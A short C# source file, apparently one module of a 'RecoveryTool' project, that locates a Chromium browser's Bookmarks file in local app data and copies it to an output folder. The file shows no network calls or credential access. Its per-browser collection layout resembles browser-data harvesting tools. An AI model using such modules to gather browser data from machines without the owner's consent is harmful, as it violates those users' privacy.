using RecoveryTool.Recovery.Utilities;

namespace RecoveryTool.Recovery.Browsers.Chromium
{
    public static class ChromiumBookmarks
    {
        public static async Task RecoverAsync(string browserName, string relativeSearchPath)
        {
            string fileName = ChromiumCommon.FileNames["Bookmarks"];
            string filePath = Path.Combine(Common.LocalData, relativeSearchPath, "Bookmarks");
            if (!File.Exists(filePath)) return;
            string outputPath = ChromiumCommon.PrepareRecoveryFilePath(browserName, fileName);
            File.Copy(filePath, outputPath, true);
        }
    }
}